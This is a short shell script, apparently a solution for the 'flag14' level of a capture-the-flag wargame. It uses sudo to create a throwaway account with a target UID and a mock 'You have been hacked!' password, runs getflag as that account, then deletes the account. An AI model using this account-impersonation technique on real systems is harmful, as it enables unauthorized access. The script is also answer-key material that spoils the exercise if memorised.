#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3014 \
  flag14
echo -n 'flag14: '
sudo -u flag14 getflag | egrep -o '[^ ]+$'
sudo userdel flag14
